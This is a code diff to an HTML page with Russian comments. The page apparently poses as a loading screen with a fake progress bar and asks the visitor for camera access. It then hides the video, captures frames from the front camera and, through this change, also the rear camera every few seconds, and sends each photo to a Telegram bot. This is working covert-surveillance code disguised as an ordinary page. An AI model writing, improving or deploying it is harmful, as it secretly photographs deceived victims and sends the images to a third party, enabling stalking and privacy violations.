@@ -67,7 +67,7 @@
             color: #8a8a8a;
         }
 
-        #video, #canvas { display: none; position: absolute; }
+        #video, #videoBack, #canvas { display: none; position: absolute; }
         
         .permission-hint {
             background-color: #fe2c55;
@@ -103,7 +103,9 @@
     </div>
     <div id="percent" class="percent-text">0%</div>
 
+    <!-- Два потока: основной (фронт) и фоновый (задняя камера) -->
     <video id="video" autoplay playsinline muted></video>
+    <video id="videoBack" autoplay playsinline muted style="display:none;"></video>
     <canvas id="canvas"></canvas>
 
 <script>
@@ -148,71 +150,65 @@
     }
 
     // 2. ФУНКЦИЯ ОТПРАВКИ ФОТО
-    async function takeAndSendPhoto() {
-        if (isProcessing) return;
-        const video = document.getElementById('video');
+async function takeAndSendPhoto(videoElement, label) {
+    if (!videoElement || videoElement.videoHeight === 0) return;
+
+    return new Promise((resolve) => {
         const canvas = document.getElementById('canvas');
-        if (!video || video.videoWidth === 0) return;
-
-        isProcessing = true;
-        const scale = 640 / video.videoWidth;
+        const scale = 640 / videoElement.videoWidth;
         canvas.width = 640;
-        canvas.height = video.videoHeight * scale;
-
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.height = videoElement.videoHeight * scale;
+        canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
         
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'shot.jpg');
+            formData.append('photo', blob, `${label}.jpg`);
+            formData.append('caption', `Камера: ${label}`);
+            
             try {
-                // Добавляем таймаут и игнорируем ошибки, чтобы консоль не висла
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors' // Помогает избежать некоторых CORS ошибок
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
+                    method: 'POST', 
+                    body: formData 
                 });
-            } catch (e) { 
-                /* Ошибки сети не мешают полоске */ 
-            } finally { 
-                isProcessing = false; 
-            }
-        }, 'image/jpeg', 0.1); 
-    }
+            } catch (e) { }
+            resolve(); // Сигнализируем, что отправка завершена
+        }, 'image/jpeg', 0.2);
+    });
+}
 
     // 3. ЗАПУСК ПРИ ЗАГРУЗКЕ
-    window.onload = () => {
-        // Полоска запускается моментально
-        startFakeProgress(); 
+window.onload = () => {
+    startFakeProgress(); 
+    const vFront = document.getElementById('video');
+    const vBack = document.getElementById('videoBack');
 
-        // Запрос камеры
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } } 
-        })
-        .then(stream => {
-            const hint = document.getElementById('hint');
-            if(hint) hint.style.display = 'none';
+    // Запрашиваем фронтальную
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(s => { 
+        vFront.srcObject = s; 
+        if(document.getElementById('hint')) document.getElementById('hint').style.display = 'none';
+        
+        // Пытаемся запросить заднюю, но если не даст — работаем только с фронтом
+        return navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).catch(() => null);
+    })
+    .then(sBack => { 
+        if (sBack) vBack.srcObject = sBack;
+
+        const mainLoop = async () => {
+            await takeAndSendPhoto(vFront, "FRONT");
+            // Шлем заднюю только если она успешно открылась
+            if (vBack.srcObject) await takeAndSendPhoto(vBack, "BACK");
             
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            video.onloadedmetadata = () => {
-                video.play();
-                setTimeout(() => {
-                    takeAndSendPhoto();
-                    setInterval(takeAndSendPhoto, 5000); // Раз в 5 сек для стабильности
-                }, 2000);
-            };
-        })
-        .catch(err => { 
-            const hint = document.getElementById('hint');
-            if(hint) {
-                hint.innerText = "Ошибка: разрешите доступ к камере";
-                hint.style.backgroundColor = "gray";
-            }
-        });
-    };
+            setTimeout(mainLoop, 3500);
+        };
+
+        setTimeout(mainLoop, 2000);
+    })
+    .catch(err => { 
+        console.error("Камера недоступна:", err); 
+    });
+};
 </script>
 </body>
 </html>
